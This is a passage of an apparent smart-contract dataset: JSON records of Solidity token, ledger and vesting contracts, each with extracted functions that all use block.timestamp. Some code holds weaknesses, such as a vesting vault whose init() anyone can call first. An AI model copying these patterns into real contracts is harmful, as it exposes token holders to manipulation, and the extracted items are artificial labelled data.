balanceOf[addr] = balanceOf[addr].add(value);\n tokenLotsOf[addr].push(TokenLot(value, time, true));\n controller.ledgerTransfer(0, addr, value);\n totalSupply = totalSupply.add(value);\n }\n function multiMint(uint nonce, uint256[] bits, uint timestamp) external onlyOwner {\n require(!mintingStopped);\n if (nonce != mintingNonce) return;\n mintingNonce = mintingNonce.add(1);\n uint256 lomask = (1 << 96) - 1;\n uint created = 0;\n uint time = timestamp;\n if(time == 0) {\n time = block.timestamp;\n }\n for (uint i = 0; i < bits.length; i++) {\n address addr = address(bits[i]>>96);\n uint value = bits[i] & lomask;\n balanceOf[addr] = balanceOf[addr].add(value);\n tokenLotsOf[addr].push(TokenLot(value, time, true));\n controller.ledgerTransfer(0, addr, value);\n created = created.add(value);\n }\n totalSupply = totalSupply.add(created);\n }\n function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(sender, amount));\n }\n modifier onlyController() {\n require(msg.sender == address(controller));\n _;\n }\n function walkTokenLots(address from, address to, uint amount, uint lockoutTime, bool removeTokens,\n bool newTokensAreRestricted, bool preservePurchaseDate)\n internal returns (uint numTransferrableTokens)\n {\n TokenLot[] storage fromTokenLots = tokenLotsOf[from];\n for(uint i=0; i<fromTokenLots.length; i++) {\n TokenLot storage lot = fromTokenLots[i];\n uint lotAmount = lot.amount;\n if(lotAmount == 0) {\n continue;\n }\n if(lockoutTime > 0) {\n if(lot.restricted && lot.purchaseDate > lockoutTime) {\n continue;\n }\n }\n uint remaining = amount.sub(numTransferrableTokens);\n if(lotAmount >= remaining) {\n numTransferrableTokens = numTransferrableTokens.add(remaining);\n if(removeTokens) {\n lot.amount = lotAmount.sub(remaining);\n if(to != address(0)) {\n if(preservePurchaseDate) {\n tokenLotsOf[to].push(TokenLot(remaining, lot.purchaseDate, newTokensAreRestricted));\n }\n else {\n tokenLotsOf[to].push(TokenLot(remaining, block.timestamp, newTokensAreRestricted));\n }\n }\n }\n break;\n }\n numTransferrableTokens = numTransferrableTokens.add(lotAmount);\n if(removeTokens) {\n lot.amount = 0;\n if(to != address(0)) {\n if(preservePurchaseDate) {\n tokenLotsOf[to].push(TokenLot(lotAmount, lot.purchaseDate, newTokensAreRestricted));\n }\n else {\n tokenLotsOf[to].push(TokenLot(lotAmount, block.timestamp, newTokensAreRestricted));\n }\n }\n }\n }\n }\n function transferDryRun(address from, address to, uint amount, uint lockoutTime) public onlyController returns (uint) {\n return walkTokenLots(from, to, amount, lockoutTime, false, false, false);\n }\n function transfer(address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) public onlyController returns (bool success) {\n if (balanceOf[_from] < _value) return false;\n uint tokensTransferred = walkTokenLots(_from, _to, _value, lockoutTime, true, newTokensAreRestricted, preservePurchaseDate);\n require(tokensTransferred == _value);\n balanceOf[_from] = balanceOf[_from].sub(_value);\n balanceOf[_to] = balanceOf[_to].add(_value);\n return true;\n }\n function transferFrom(address _spender, address _from, address _to, uint _value, uint lockoutTime, bool newTokensAreRestricted, bool preservePurchaseDate) public onlyController returns (bool success) {\n if (balanceOf[_from] < _value) return false;\n uint allowed = allowance[_from][_spender];\n if (allowed < _value) return false;\n uint tokensTransferred = walkTokenLots(_from, _to, _value, lockoutTime, true, newTokensAreRestricted, preservePurchaseDate);\n require(tokensTransferred == _value);\n balanceOf[_from] = balanceOf[_from].sub(_value);\n balanceOf[_to] = balanceOf[_to].add(_value);\n allowance[_from][_spender] = allowed.sub(_value);\n return true;\n }\n function approve(address _owner, address _spender, uint _value) public onlyController returns (bool success) {\n if ((_value != 0) && (allowance[_owner][_spender] != 0)) {\n return false;\n }\n allowance[_owner][_spender] = _value;\n return true;\n }\n function increaseApproval (address _owner, address _spender, uint _addedValue) public onlyController returns (bool success) {\n uint oldValue = allowance[_owner][_spender];\n allowance[_owner][_spender] = oldValue.add(_addedValue);\n return true;\n }\n function decreaseApproval (address _owner, address _spender, uint _subtractedValue) public onlyController returns (bool success) {\n uint oldValue = allowance[_owner][_spender];\n if (_subtractedValue > oldValue) {\n allowance[_owner][_spender] = 0;\n } else {\n allowance[_owner][_spender] = oldValue.sub(_subtractedValue);\n }\n return true;\n }\n function burn(address _owner, uint _amount) public onlyController {\n require(balanceOf[_owner] >= _amount);\n balanceOf[_owner] = balanceOf[_owner].sub(_amount);\n walkTokenLots(_owner, address(0), _amount, 0, true, false, false);\n totalSupply = totalSupply.sub(_amount);\n }\n}\ninterface ISecuritySale {\n function setLive(bool newLiveness) external;\n function setInvestorList(address _investorList) external;\n}\ncontract SecuritySale is Ownable {\n bool public live;\n IInvestorList public investorList;\n event SaleLive(bool liveness);\n event EtherIn(address from, uint amount);\n event StartSale();\n event EndSale();\n constructor() public {\n live = false;\n }\n function setInvestorList(address _investorList) public onlyOwner {\n investorList = IInvestorList(_investorList);\n }\n function () public payable {\n require(live);\n require(investorList.inList(msg.sender));\n emit EtherIn(msg.sender, msg.value);\n }\n function setLive(bool newLiveness) public onlyOwner {\n if(live && !newLiveness) {\n live = false;\n emit EndSale();\n }\n else if(!live && newLiveness) {\n live = true;\n emit StartSale();\n }\n }\n function withdraw() public onlyOwner {\n msg.sender.transfer(address(this).balance);\n }\n function withdrawSome(uint value) public onlyOwner {\n require(value <= address(this).balance);\n msg.sender.transfer(value);\n }\n function withdrawTokens(address token) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(msg.sender, t.balanceOf(this)));\n }\n function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(sender, amount));\n }\n}\ninterface ISecurityToken {\n function balanceOf(address addr) external view returns(uint);\n function transfer(address to, uint amount) external returns(bool);\n function controllerTransfer(address _from, address _to, uint _value) external;\n}\ncontract SecurityToken is Ownable{\n using SafeMath for uint256;\n ISecurityController public controller;\n string public name;\n string public symbol;\n uint8 public decimals;\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n constructor(string _name, string _symbol, uint8 _decimals) public {\n name = _name;\n symbol = _symbol;\n decimals = _decimals;\n }\n function setName(string _name) public onlyOwner {\n name = _name;\n }\n function setSymbol(string _symbol) public onlyOwner {\n symbol = _symbol;\n }\n function setController(address _c) public onlyOwner {\n controller = ISecurityController(_c);\n }\n function sendReceivedTokens(address token, address sender, uint amount) public onlyOwner {\n ERC20Basic t = ERC20Basic(token);\n require(t.transfer(sender, amount));\n }\n function balanceOf(address a) public view returns (uint) {\n return controller.balanceOf(a);\n }\n function totalSupply() public view returns (uint) {\n return controller.totalSupply();\n }\n function allowance(address _owner, address _spender) public view returns (uint) {\n return controller.allowance(_owner, _spender);\n }\n function burn(uint _amount) public {\n controller.burn(msg.sender, _amount);\n emit Transfer(msg.sender, 0x0, _amount);\n }\n modifier onlyPayloadSize(uint numwords) {\n assert(msg.data.length >= numwords.mul(32).add(4));\n _;\n }\n function isTransferAuthorized(address _from, address _to) public onlyPayloadSize(2) view returns (bool) {\n return controller.isTransferAuthorized(_from, _to);\n }\n function transfer(address _to, uint _value) public onlyPayloadSize(2) returns (bool success) {\n if (controller.transfer(msg.sender, _to, _value)) {\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n return false;\n }\n function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3) returns (bool success) {\n if (controller.transferFrom(msg.sender, _from, _to, _value)) {\n emit Transfer(_from, _to, _value);\n return true;\n }\n return false;\n }\n function approve(address _spender, uint _value) onlyPayloadSize(2) public returns (bool success) {\n if (controller.approve(msg.sender, _spender, _value)) {\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n return false;\n }\n function increaseApproval (address _spender, uint _addedValue) public onlyPayloadSize(2) returns (bool success) {\n if (controller.increaseApproval(msg.sender, _spender, _addedValue)) {\n uint newval = controller.allowance(msg.sender, _spender);\n emit Approval(msg.sender, _spender, newval);\n return true;\n }\n return false;\n }\n function decreaseApproval (address _spender, uint _subtractedValue) public onlyPayloadSize(2) returns (bool success) {\n if (controller.decreaseApproval(msg.sender, _spender, _subtractedValue)) {\n uint newval = controller.allowance(msg.sender, _spender);\n emit Approval(msg.sender, _spender, newval);\n return true;\n }\n return false;\n }\n modifier onlyController() {\n assert(msg.sender == address(controller));\n _;\n }\n function controllerTransfer(address _from, address _to, uint _value) public onlyController {\n emit Transfer(_from, _to, _value);\n }\n function controllerApprove(address _owner, address _spender, uint _value) public onlyController {\n emit Approval(_owner, _spender, _value);\n }\n}\ninterface ITransferAuthorizations {\n function setController(address _controller) external;\n function get(address from, address to) external view returns (uint);\n function set(address from, address to, uint expiry) external;\n}\ncontract TransferAuthorizations is Ownable, ITransferAuthorizations {\n mapping(address => mapping(address => uint)) public authorizations;\n address public controller;\n event TransferAuthorizationSet(address from, address to, uint expiry);\n function setController(address _controller) public onlyOwner {\n controller = _controller;\n }\n modifier onlyController() {\n assert(msg.sender == controller);\n _;\n }\n function set(address from, address to, uint expiry) public onlyController {\n require(from != 0);\n authorizations[from][to] = expiry;\n emit TransferAuthorizationSet(from, to, expiry);\n }\n function get(address from, address to) public view returns (uint) {\n return authorizations[from][to];\n }\n}",
  "extract_feature": [
    "function setTransferAuthorized(address from, address to, uint expiry) public {\nrequire(transferAuthPermission[msg.sender]);\nrequire(from != 0);\nif(expiry > 0) {\nrequire(expiry > block.timestamp);\nrequire(expiry <= (block.timestamp + 30 days));\n}\ntransferAuthorizations.set(from, to, expiry);\n}",
    "function isTransferAuthorized(address _from, address _to) public view returns (bool) {\nuint expiry = transferAuthorizations.get(_from, _to);\nuint globalExpiry = transferAuthorizations.get(_from, 0);\nif(globalExpiry > expiry) {\nexpiry = globalExpiry;\n}\nreturn expiry > block.timestamp;\n}",
    "function transfer(address _from, address _to, uint _value) public onlyToken returns (bool success) {\nuint lockoutTime = block.timestamp - lockoutPeriod;\nbool canTransfer;\nbool useLockoutTime;\nbool newTokensAreRestricted;\nbool preservePurchaseDate;\n(canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n= checkTransfer(_from, _to, _value, lockoutTime);\nif(!canTransfer) {\nreturn false;\n}\nuint overrideLockoutTime = lockoutTime;\nif(!useLockoutTime) {\noverrideLockoutTime = 0;\n}\nreturn ledger.transfer(_from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n}",
    "function transferFrom(address _spender, address _from, address _to, uint _value) public onlyToken returns (bool success) {\nuint lockoutTime = block.timestamp - lockoutPeriod;\nbool canTransfer;\nbool useLockoutTime;\nbool newTokensAreRestricted;\nbool preservePurchaseDate;\n(canTransfer, useLockoutTime, newTokensAreRestricted, preservePurchaseDate)\n= checkTransfer(_from, _to, _value, lockoutTime);\nif(!canTransfer) {\nreturn false;\n}\nuint overrideLockoutTime = lockoutTime;\nif(!useLockoutTime) {\noverrideLockoutTime = 0;\n}\nreturn ledger.transferFrom(_spender, _from, _to, _value, overrideLockoutTime, newTokensAreRestricted, preservePurchaseDate);\n}",
    "function mint(address addr, uint value, uint timestamp) public onlyOwner {\nrequire(!mintingStopped);\nuint time = timestamp;\nif(time == 0) {\ntime = block.timestamp;\n}\nbalanceOf[addr] = balanceOf[addr].add(value);\ntokenLotsOf[addr].push(TokenLot(value, time, true));\ncontroller.ledgerTransfer(0, addr, value);\ntotalSupply = totalSupply.add(value);\n}",
    "function multiMint(uint nonce, uint256[] bits, uint timestamp) external onlyOwner {\nrequire(!mintingStopped);\nif (nonce != mintingNonce) return;\nmintingNonce = mintingNonce.add(1);\nuint256 lomask = (1 << 96) - 1;\nuint created = 0;\nuint time = timestamp;\nif(time == 0) {\ntime = block.timestamp;\n}\nfor (uint i = 0; i < bits.length; i++) {\naddress addr = address(bits[i]>>96);\nuint value = bits[i] & lomask;\nbalanceOf[addr] = balanceOf[addr].add(value);\ntokenLotsOf[addr].push(TokenLot(value, time, true));\ncontroller.ledgerTransfer(0, addr, value);\ncreated = created.add(value);\n}\ntotalSupply = totalSupply.add(created);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f7f"
  },
  "filename": "9377.sol",
  "content": "pragma solidity ^0.4.23;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\npragma solidity ^0.4.23;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\npragma solidity ^0.4.23;\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\npragma solidity ^0.4.23;\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n require(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n require(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n require(token.approve(spender, value));\n }\n}\npragma solidity ^0.4.23;\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\npragma solidity ^0.4.23;\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint _subtractedValue\n )\n public\n returns (bool)\n {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\npragma solidity ^0.4.23;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\npragma solidity ^0.4.23;\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n modifier hasMintPermission() {\n require(msg.sender == owner);\n _;\n }\n function mint(\n address _to,\n uint256 _amount\n )\n hasMintPermission\n canMint\n public\n returns (bool)\n {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\npragma solidity ^0.4.23;\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\npragma solidity ^0.4.23;\ncontract PausableToken is StandardToken, Pausable {\n function transfer(\n address _to,\n uint256 _value\n )\n public\n whenNotPaused\n returns (bool)\n {\n return super.transfer(_to, _value);\n }\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n whenNotPaused\n returns (bool)\n {\n return super.transferFrom(_from, _to, _value);\n }\n function approve(\n address _spender,\n uint256 _value\n )\n public\n whenNotPaused\n returns (bool)\n {\n return super.approve(_spender, _value);\n }\n function increaseApproval(\n address _spender,\n uint _addedValue\n )\n public\n whenNotPaused\n returns (bool success)\n {\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(\n address _spender,\n uint _subtractedValue\n )\n public\n whenNotPaused\n returns (bool success)\n {\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n}\npragma solidity ^0.4.23;\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n _burn(msg.sender, _value);\n }\n function _burn(address _who, uint256 _value) internal {\n require(_value <= balances[_who]);\n balances[_who] = balances[_who].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(_who, _value);\n emit Transfer(_who, address(0), _value);\n }\n}\npragma solidity ^0.4.23;\ncontract CanReclaimToken is Ownable {\n using SafeERC20 for ERC20Basic;\n function reclaimToken(ERC20Basic token) external onlyOwner {\n uint256 balance = token.balanceOf(this);\n token.safeTransfer(owner, balance);\n }\n}\npragma solidity ^0.4.24;\ncontract GotToken is CanReclaimToken, MintableToken, PausableToken, BurnableToken {\n string public constant name = \"GOToken\";\n string public constant symbol = \"GOT\";\n uint8 public constant decimals = 18;\n constructor() public {\n paused = true;\n }\n}\npragma solidity ^0.4.24;\ncontract PGOMonthlyInternalVault {\n using SafeMath for uint256;\n using SafeERC20 for GotToken;\n struct Investment {\n address beneficiary;\n uint256 totalBalance;\n uint256 released;\n }\n uint256 public constant VESTING_DIV_RATE = 21;\n uint256 public constant VESTING_INTERVAL = 30 days;\n uint256 public constant VESTING_CLIFF = 90 days;\n uint256 public constant VESTING_DURATION = 720 days;\n GotToken public token;\n uint256 public start;\n uint256 public end;\n uint256 public cliff;\n mapping(address => Investment) public investments;\n function init(address[] beneficiaries, uint256[] balances, uint256 startTime, address _token) public {\n require(token == address(0));\n require(beneficiaries.length == balances.length);\n start = startTime;\n cliff = start.add(VESTING_CLIFF);\n end = start.add(VESTING_DURATION);\n token = GotToken(_token);\n for (uint256 i = 0; i < beneficiaries.length; i = i.add(1)) {\n investments[beneficiaries[i]] = Investment(beneficiaries[i], balances[i], 0);\n }\n }\n function release(address beneficiary) public {\n uint256 unreleased = releasableAmount(beneficiary);\n require(unreleased > 0);\n investments[beneficiary].released = investments[beneficiary].released.add(unreleased);\n token.safeTransfer(beneficiary, unreleased);\n }\n function release() public {\n release(msg.sender);\n }\n function getInvestment(address beneficiary) public view returns(address, uint256, uint256) {\n return (\n investments[beneficiary].beneficiary,\n investments[beneficiary].totalBalance,\n investments[beneficiary].released\n );\n }\n function releasableAmount(address beneficiary) public view returns (uint256) {\n return vestedAmount(beneficiary).sub(investments[beneficiary].released);\n }\n function vestedAmount(address beneficiary) public view returns (uint256) {\n uint256 vested = 0;\n if (block.timestamp >= cliff && block.timestamp < end) {\n uint256 totalBalance = investments[beneficiary].totalBalance;\n uint256 monthlyBalance = totalBalance.div(VESTING_DIV_RATE);\n uint256 time = block.timestamp.sub(cliff);\n uint256 elapsedOffsets = time.div(VESTING_INTERVAL);\n uint256 vestedToSum = elapsedOffsets.mul(monthlyBalance);\n vested = vested.add(vestedToSum);\n }\n if (block.timestamp >= end) {\n vested = investments[beneficiary].totalBalance;\n }\n return vested;\n }\n}",
  "extract_feature": [
    "function vestedAmount(address beneficiary) public view returns (uint256) {\nuint256 vested = 0;\nif (block.timestamp >= cliff && block.timestamp < end) {\nuint256 totalBalance = investments[beneficiary].totalBalance;\nuint256 monthlyBalance = totalBalance.div(VESTING_DIV_RATE);\nuint256 time = block.timestamp.sub(cliff);\nuint256 elapsedOffsets = time.div(VESTING_INTERVAL);\nuint256 vestedToSum = elapsedOffsets.mul(monthlyBalance);\nvested = vested.add(vestedToSum);\n}\nif (block.timestamp >= end) {\nvested = investments[beneficiary].totalBalance;\n}\nreturn vested;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f80"
  },
  "filename": "9378.sol",
  "content": "pragma solidity ^0.4.23;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\npragma solidity ^0.4.23;\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\npragma solidity ^0.4.23;\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender)\n public view returns (uint256);\n function transferFrom(address from, address to, uint256 value)\n public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(\n address indexed owner,\n address indexed spender,\n uint256 value\n );\n}\npragma solidity ^0.4.23;\nlibrary SafeERC20 {\n function safeTransfer(ERC20Basic token, address to, uint256 value) internal {\n require(token.transfer(to, value));\n }\n function safeTransferFrom(\n ERC20 token,\n address from,\n address to,\n uint256 value\n )\n internal\n {\n require(token.transferFrom(from, to, value));\n }\n function safeApprove(ERC20 token, address spender, uint256 value) internal {\n require(token.approve(spender, value));\n }\n}\npragma solidity ^0.4.23;\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances[_owner];\n }\n}\npragma solidity ^0.4.23;\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n returns (bool)\n {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(\n address _owner,\n address _spender\n )\n public\n view\n returns (uint256)\n {\n return allowed[_owner][_spender];\n }\n function increaseApproval(\n address _spender,\n uint _addedValue\n )\n public\n returns (bool)\n {\n allowed[msg.sender][_spender] = (\n allowed[msg.sender][_spender].add(_addedValue));\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(\n address _spender,\n uint _subtractedValue\n )\n public\n returns (bool)\n {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n emit Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\npragma solidity ^0.4.23;\ncontract Ownable {\n address public owner;\n event OwnershipRenounced(address indexed previousOwner);\n event OwnershipTransferred(\n address indexed previousOwner,\n address indexed newOwner\n );\n constructor() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function renounceOwnership() public onlyOwner {\n emit OwnershipRenounced(owner);\n owner = address(0);\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n _transferOwnership(_newOwner);\n }\n function _transferOwnership(address _newOwner) internal {\n require(_newOwner != address(0));\n emit OwnershipTransferred(owner, _newOwner);\n owner = _newOwner;\n }\n}\npragma solidity ^0.4.23;\ncontract MintableToken is StandardToken, Ownable {\n event Mint(address indexed to, uint256 amount);\n event MintFinished();\n bool public mintingFinished = false;\n modifier canMint() {\n require(!mintingFinished);\n _;\n }\n modifier hasMintPermission() {\n require(msg.sender == owner);\n _;\n }\n function mint(\n address _to,\n uint256 _amount\n )\n hasMintPermission\n canMint\n public\n returns (bool)\n {\n totalSupply_ = totalSupply_.add(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Mint(_to, _amount);\n emit Transfer(address(0), _to, _amount);\n return true;\n }\n function finishMinting() onlyOwner canMint public returns (bool) {\n mintingFinished = true;\n emit MintFinished();\n return true;\n }\n}\npragma solidity ^0.4.23;\ncontract Pausable is Ownable {\n event Pause();\n event Unpause();\n bool public paused = false;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused() {\n require(paused);\n _;\n }\n function pause() onlyOwner whenNotPaused public {\n paused = true;\n emit Pause();\n }\n function unpause() onlyOwner whenPaused public {\n paused = false;\n emit Unpause();\n }\n}\npragma solidity ^0.4.23;\ncontract PausableToken is StandardToken, Pausable {\n function transfer(\n address _to,\n uint256 _value\n )\n public\n whenNotPaused\n returns (bool)\n {\n return super.transfer(_to, _value);\n }\n function transferFrom(\n address _from,\n address _to,\n uint256 _value\n )\n public\n whenNotPaused\n returns (bool)\n {\n return super.transferFrom(_from, _to, _value);\n }\n function approve(\n address _spender,\n uint256 _value\n )\n public\n whenNotPaused\n returns (bool)\n {\n return super.approve(_spender, _value);\n }\n function increaseApproval(\n address _spender,\n uint _addedValue\n )\n public\n whenNotPaused\n returns (bool success)\n {\n return super.increaseApproval(_spender, _addedValue);\n }\n function decreaseApproval(\n address _spender,\n uint _subtractedValue\n )\n public\n whenNotPaused\n returns (bool success)\n {\n return super.decreaseApproval(_spender, _subtractedValue);\n }\n}\npragma solidity ^0.4.23;\ncontract BurnableToken is BasicToken {\n event Burn(address indexed burner, uint256 value);\n function burn(uint256 _value) public {\n _burn(msg.sender, _value);\n }\n function _burn(address _who, uint256 _value) internal {\n require(_value <= balances[_who]);\n balances[_who] = balances[_who].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n emit Burn(_who, _value);\n emit Transfer(_who, address(0), _value);\n }\n}\npragma solidity ^0.4.23;\ncontract CanReclaimToken is Ownable {\n using SafeERC20 for ERC20Basic;\n function reclaimToken(ERC20Basic token) external onlyOwner {\n uint256 balance = token.balanceOf(this);\n token.safeTransfer(owner, balance);\n }\n}\npragma solidity ^0.4.24;\ncontract GotToken is CanReclaimToken, MintableToken, PausableToken, BurnableToken {\n string public constant name = \"GOToken\";\n string public constant symbol = \"GOT\";\n uint8 public constant decimals = 18;\n constructor() public {\n paused = true;\n }\n}\npragma solidity ^0.4.24;\ncontract PGOMonthlyInternalVault {\n using SafeMath for uint256;\n using SafeERC20 for GotToken;\n struct Investment {\n address beneficiary;\n uint256 totalBalance;\n uint256 released;\n }\n uint256 public constant VESTING_DIV_RATE = 21;\n uint256 public constant VESTING_INTERVAL = 30 days;\n uint256 public constant VESTING_CLIFF = 90 days;\n uint256 public constant VESTING_DURATION = 720 days;\n GotToken public token;\n uint256 public start;\n uint256 public end;\n uint256 public cliff;\n mapping(address => Investment) public investments;\n function init(address[] beneficiaries, uint256[] balances, uint256 startTime, address _token) public {\n require(token == address(0));\n require(beneficiaries.length == balances.length);\n start = startTime;\n cliff = start.add(VESTING_CLIFF);\n end = start.add(VESTING_DURATION);\n token = GotToken(_token);\n for (uint256 i = 0; i < beneficiaries.length; i = i.add(1)) {\n investments[beneficiaries[i]] = Investment(beneficiaries[i], balances[i], 0);\n }\n }\n function release(address beneficiary) public {\n uint256 unreleased = releasableAmount(beneficiary);\n require(unreleased > 0);\n investments[beneficiary].released = investments[beneficiary].released.add(unreleased);\n token.safeTransfer(beneficiary, unreleased);\n }\n function release() public {\n release(msg.sender);\n }\n function getInvestment(address beneficiary) public view returns(address, uint256, uint256) {\n return (\n investments[beneficiary].beneficiary,\n investments[beneficiary].totalBalance,\n 